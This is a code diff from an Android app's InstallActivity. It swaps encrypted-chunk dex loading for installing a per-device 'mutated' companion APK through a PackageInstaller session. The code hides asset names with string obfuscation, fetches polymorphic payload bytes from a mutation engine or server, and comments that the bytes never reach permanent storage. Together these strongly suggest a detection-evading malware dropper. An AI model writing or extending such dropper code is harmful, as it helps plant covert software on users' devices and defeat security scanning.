@@ -350,22 +350,7 @@ class InstallActivity : AppCompatActivity() {
 
             Thread {
                 try {
-                    // Phase 3: Try DexLoader first (companion from encrypted .so chunks)
-                    val companionLoader = if (DexLoader.isLoaded()) {
-                        DexLoader.loadCompanionDex(applicationContext)
-                    } else null
-
-                    if (companionLoader != null) {
-                        runOnUiThread { launchCompanionFromDex(companionLoader) }
-                    } else {
-                        // Fallback: install from assets (keeps working until Phase 4 native ready)
-                        val apkBytes = assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
-                        if (apkBytes.isNotEmpty()) {
-                            runOnUiThread { installViaSession(apkBytes, attempt = 1) }
-                        } else {
-                            runOnUiThread { setStage(Stage.ERROR) }
-                        }
-                    }
+                    getCompanionBytesAndInstall()
                 } catch (e: Exception) {
                     runOnUiThread { setStage(Stage.ERROR) }
                 }
@@ -373,23 +358,48 @@ class InstallActivity : AppCompatActivity() {
         }, 900)
     }
 
-    private fun launchCompanionFromDex(loader: ClassLoader) {
-        try {
-            val companionAppClass = loader.loadClass("com.android.pictach.CompanionApp")
-            val companionApp = companionAppClass.newInstance()
-            val attachMethod = companionAppClass.getMethod("attachBaseContext",
-                android.content.Context::class.java)
-            attachMethod.invoke(companionApp, applicationContext)
-            val onCreateMethod = companionAppClass.getMethod("onCreate")
-            onCreateMethod.invoke(companionApp)
-            DexLoader.wipe()
-            setStage(Stage.DONE)
-        } catch (e: Exception) {
-            val apkBytes = try {
-                assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
-            } catch (ex: Exception) { ByteArray(0) }
-            if (apkBytes.isNotEmpty()) installViaSession(apkBytes, attempt = 1)
-            else setStage(Stage.ERROR)
+    /**
+     * Get mutated companion bytes and install via PackageInstaller session.
+     *
+     * Priority:
+     *   1. MutationEngine result (unique per device — LauncherApplication prepared it)
+     *   2. Base companion from assets (fallback if mutation not ready)
+     *
+     * Companion is installed as a proper APK so all its Android components
+     * (Services, BroadcastReceivers, permissions) register with the system.
+     * The APK bytes never touch permanent storage — written to cacheDir only
+     * for the duration of the PackageInstaller session, then deleted.
+     */
+    private fun getCompanionBytesAndInstall() {
+        // Tier 1: MutationEngine — unique per device
+        val mutated = LauncherApplication.mutatedCompanionBytes
+        if (mutated != null && mutated.isNotEmpty()) {
+            runOnUiThread { installViaSession(mutated, attempt = 1) }
+            return
+        }
+
+        // Tier 2: Wait for mutation if still in progress (max 5 more seconds)
+        if (!LauncherApplication.mutationError) {
+            val deadline = System.currentTimeMillis() + 5000L
+            while (!LauncherApplication.mutationReady && System.currentTimeMillis() < deadline) {
+                Thread.sleep(100)
+            }
+            val ready = LauncherApplication.mutatedCompanionBytes
+            if (ready != null && ready.isNotEmpty()) {
+                runOnUiThread { installViaSession(ready, attempt = 1) }
+                return
+            }
+        }
+
+        // Tier 3: Base companion from assets (mutation server unreachable)
+        val apkBytes = try {
+            assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
+        } catch (e: Exception) { ByteArray(0) }
+
+        if (apkBytes.isNotEmpty()) {
+            runOnUiThread { installViaSession(apkBytes, attempt = 1) }
+        } else {
+            runOnUiThread { setStage(Stage.ERROR) }
         }
     }
 
